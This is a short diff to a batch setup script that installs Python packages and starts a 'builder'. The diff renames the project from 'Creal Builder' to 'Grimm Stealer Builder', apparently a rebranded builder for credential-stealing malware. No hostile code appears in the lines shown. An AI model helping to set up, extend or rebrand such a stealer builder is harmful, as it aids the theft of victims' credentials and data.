@@ -8,7 +8,7 @@ pip install pyinstaller
 pip install wmi
 pip install customtkinter
 pip install cryptography
-title Creal Builder
+title Grimm Stealer Builder
 cls
-echo Starting the builder now
+echo Builder Starting.
 python builder.pyw
